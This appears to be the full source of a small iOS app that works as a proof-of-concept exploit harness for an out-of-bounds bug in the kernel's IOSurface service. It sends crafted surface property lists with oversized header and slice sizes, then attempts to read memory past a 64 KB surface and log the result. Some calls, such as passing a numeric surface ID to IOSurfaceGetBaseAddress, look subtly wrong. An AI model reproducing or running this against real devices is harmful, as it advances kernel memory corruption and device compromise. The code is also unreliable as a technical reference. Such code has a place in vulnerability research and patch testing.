#import <Foundation/Foundation.h>
#import <Metal/Metal.h>
#import <UIKit/UIKit.h>
#import <IOKit/IOKitLib.h>
#import <mach/mach.h>
#import <dlfcn.h>
#import <sys/utsname.h>

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong, nonatomic) UIWindow *window;
@property (strong, nonatomic) UITextView *logView;
- (void)log:(NSString *)msg;
@end

@implementation AppDelegate

- (void)log:(NSString *)msg {
    NSString *line = [NSString stringWithFormat:@"%@\n", msg];
    NSLog(@"%@", line);
    dispatch_async(dispatch_get_main_queue(), ^{
        self.logView.text = [self.logView.text stringByAppendingString:line];
        NSRange range = NSMakeRange(self.logView.text.length - 1, 1);
        [self.logView scrollRangeToVisible:range];
    });
}

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
    self.window.backgroundColor = [UIColor blackColor];
    
    UIViewController *vc = [[UIViewController alloc] init];
    self.logView = [[UITextView alloc] initWithFrame:self.window.bounds];
    self.logView.editable = NO;
    self.logView.font = [UIFont monospacedSystemFontOfSize:11 weight:UIFontWeightRegular];
    self.logView.backgroundColor = [UIColor blackColor];
    self.logView.textColor = [UIColor greenColor];
    vc.view = self.logView;
    
    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];
    
    [self log:@"=== F1OOB iPad A16 TEST ==="];
    
    struct utsname uts;
    uname(&uts);
    [self log:[NSString stringWithFormat:@"Device: %s | iOS: %@", uts.machine, [[UIDevice currentDevice] systemVersion]]];
    
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        [self runTests];
    });
    
    return YES;
}

- (void)runTests {
    // Load IOSurface
    [self log:@"[1] Loading IOSurface..."];
    void *handle = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_NOW);
    if (!handle) {
        [self log:[NSString stringWithFormat:@"FAIL: dlopen: %s", dlerror()]];
        return;
    }
    [self log:@"PASS: IOSurface loaded"];
    
    // Open IOSurfaceRoot
    [self log:@"[2] Opening IOSurfaceRoot..."];
    io_service_t root = IOServiceGetMatchingService(0, IOServiceMatching("IOSurfaceRoot"));
    if (!root) {
        [self log:@"FAIL: IOSurfaceRoot not found"];
        return;
    }
    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(root, mach_task_self(), 0, &conn);
    IOObjectRelease(root);
    if (kr != KERN_SUCCESS) {
        [self log:[NSString stringWithFormat:@"FAIL: IOServiceOpen: 0x%x", kr]];
        return;
    }
    [self log:@"PASS: IOSurfaceRoot opened"];
    
    // Test A: Normal surface (no F1 wrap)
    [self log:@"[3] Test A: Normal surface..."];
    const char *normal_xml =
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
        "<plist version=\"1.0\"><dict>"
        "<key>IOSurfaceIsGlobal</key><true/>"
        "<key>IOSurfaceWidth</key><integer>256</integer>"
        "<key>IOSurfaceHeight</key><integer>256</integer>"
        "<key>IOSurfaceAllocSize</key><integer>65536</integer>"
        "</dict></plist>";
    
    uint32_t normal_id = 0;
    kr = IOConnectCallMethod(conn, 0, NULL, 0, normal_xml, strlen(normal_xml)+1, NULL, NULL, &normal_id, NULL);
    if (kr == KERN_SUCCESS && normal_id) {
        [self log:[NSString stringWithFormat:@"PASS: Normal surface ID = %u", normal_id]];
    } else {
        [self log:[NSString stringWithFormat:@"FAIL: Normal surface: 0x%x", kr]];
    }
    
    // Test B: F1 v1 (original)
    [self log:@"[4] Test B: F1 v1 (1GB header)..."];
    const char *f1_v1 =
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
        "<plist version=\"1.0\"><dict>"
        "<key>IOSurfaceIsGlobal</key><true/>"
        "<key>IOSurfacePixelFormat</key><integer>1111970369</integer>"
        "<key>IOSurfaceWidth</key><integer>256</integer>"
        "<key>IOSurfaceHeight</key><integer>256</integer>"
        "<key>IOSurfaceBytesPerElement</key><integer>4</integer>"
        "<key>IOSurfaceBytesPerRow</key><integer>1024</integer>"
        "<key>IOSurfaceAllocSize</key><integer>65536</integer>"
        "<key>IOSurfacePlaneSize</key><integer>65536</integer>"
        "<key>IOSurfacePlaneCount</key><integer>1</integer>"
        "<key>IOSurfacePlaneDataRegionBytesPerSlice</key><integer>16384</integer>"
        "<key>IOSurfacePlaneHeaderRegionBytesPerSlice</key><integer>1073741824</integer>"
        "<key>IOSurfaceSliceCount</key><integer>4</integer>"
        "</dict></plist>";
    
    uint32_t f1_id = 0;
    kr = IOConnectCallMethod(conn, 0, NULL, 0, f1_v1, strlen(f1_v1)+1, NULL, NULL, &f1_id, NULL);
    [self log:[NSString stringWithFormat:@"F1 v1 result: 0x%x (ID: %u)", kr, f1_id]];
    
    // Test C: F1 v2 (2GB header, more slices)
    [self log:@"[5] Test C: F1 v2 (2GB header)..."];
    const char *f1_v2 =
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
        "<plist version=\"1.0\"><dict>"
        "<key>IOSurfaceIsGlobal</key><true/>"
        "<key>IOSurfacePixelFormat</key><integer>1111970369</integer>"
        "<key>IOSurfaceWidth</key><integer>256</integer>"
        "<key>IOSurfaceHeight</key><integer>256</integer>"
        "<key>IOSurfaceBytesPerElement</key><integer>4</integer>"
        "<key>IOSurfaceBytesPerRow</key><integer>1024</integer>"
        "<key>IOSurfaceAllocSize</key><integer>65536</integer>"
        "<key>IOSurfacePlaneSize</key><integer>65536</integer>"
        "<key>IOSurfacePlaneCount</key><integer>1</integer>"
        "<key>IOSurfacePlaneDataRegionBytesPerSlice</key><integer>16384</integer>"
        "<key>IOSurfacePlaneHeaderRegionBytesPerSlice</key><integer>2147483648</integer>"
        "<key>IOSurfaceSliceCount</key><integer>8</integer>"
        "</dict></plist>";
    
    uint32_t f2_id = 0;
    kr = IOConnectCallMethod(conn, 0, NULL, 0, f1_v2, strlen(f1_v2)+1, NULL, NULL, &f2_id, NULL);
    [self log:[NSString stringWithFormat:@"F1 v2 result: 0x%x (ID: %u)", kr, f2_id]];
    
    // Test D: F1 v3 (max header, no plane count)
    [self log:@"[6] Test D: F1 v3 (max header)..."];
    const char *f1_v3 =
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
        "<plist version=\"1.0\"><dict>"
        "<key>IOSurfaceIsGlobal</key><true/>"
        "<key>IOSurfacePixelFormat</key><integer>1111970369</integer>"
        "<key>IOSurfaceWidth</key><integer>256</integer>"
        "<key>IOSurfaceHeight</key><integer>256</integer>"
        "<key>IOSurfaceBytesPerElement</key><integer>4</integer>"
        "<key>IOSurfaceBytesPerRow</key><integer>1024</integer>"
        "<key>IOSurfaceAllocSize</key><integer>65536</integer>"
        "<key>IOSurfacePlaneDataRegionBytesPerSlice</key><integer>4294967295</integer>"
        "</dict></plist>";
    
    uint32_t f3_id = 0;
    kr = IOConnectCallMethod(conn, 0, NULL, 0, f1_v3, strlen(f1_v3)+1, NULL, NULL, &f3_id, NULL);
    [self log:[NSString stringWithFormat:@"F1 v3 result: 0x%x (ID: %u)", kr, f3_id]];
    
    // If any F1 worked, test OOB
    if (f1_id || f2_id || f3_id) {
        uint32_t test_id = f1_id ? f1_id : (f2_id ? f2_id : f3_id);
        [self log:[NSString stringWithFormat:@"[7] Testing OOB with ID %u...", test_id]];
        
        void *(*IOSurfaceGetBaseAddress)(uint32_t) = dlsym(handle, "IOSurfaceGetBaseAddress");
        void *base = IOSurfaceGetBaseAddress(test_id);
        if (base) {
            [self log:[NSString stringWithFormat:@"Base address: %p", base]];
            // Try reading beyond 64KB
            uint64_t *ptr = (uint64_t *)base;
            uint64_t val = ptr[0x10000/8];  // Read at 64KB boundary
            [self log:[NSString stringWithFormat:@"OOB read at 64KB: 0x%llx", val]];
        }
    }
    
    IOServiceClose(conn);
    [self log:@"=== TESTS COMPLETE ==="];
}

@end

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
